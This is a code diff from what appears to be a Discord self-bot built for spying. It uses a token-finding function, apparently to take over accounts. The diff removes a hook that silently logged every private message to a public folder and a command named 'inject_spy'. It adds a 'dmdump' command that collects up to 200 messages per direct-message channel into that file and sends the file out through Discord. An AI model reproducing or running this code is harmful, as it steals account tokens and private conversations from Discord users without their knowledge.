@@ -39,27 +39,23 @@ def find_tokens(path):
                     tokens.append(token)
     return tokens
 
-intents = discord.Intents.all()
-prefix = "!"
-client = discord.Client()
+prefix = "!!"
 message = discord.Message 
-bot = commands.Bot(command_prefix=prefix, self_bot=True, intents=intents)
+bot = commands.Bot(command_prefix=prefix, self_bot=True)
 
 @bot.event
 async def on_ready():
     print("Logged in as: " + bot.user.name)
 
-@bot.event
-async def on_message(message):
-    with open("C:\\Users\\Public\\dms.txt", "a") as dms:
-        if message.channel.type is discord.ChannelType.private:
-            current_time = datetime.datetime.now()
-            dms.write(str(current_time.hour) + ":" + str(current_time.minute) + ":" + str(current_time.second) + str(message.author) + str(message.channel) + "> " + str(message.content) + "\n")
-
 @bot.command()
-async def inject_spy(ctx):
-    ctx.send(file=discord.File("C:\\Users\\Public\\dms.txt"))
-
+async def dmdump(ctx):
+    for ch in bot.private_channels:
+        messages = await ch.history(limit=200).flatten()
+        for message in messages:
+            with open("C:\\Users\\Public\\dms.txt", "a", encoding='utf-8-sig') as dmfile:
+                to_write = str(message.channel) + "> " + str(message.content) + "\n"
+                dmfile.write(to_write)
+        ctx.send(file=discord.File("C:\\Users\\Public\\dms.txt"))
 @bot.command()
 async def delete(ctx):
     try:
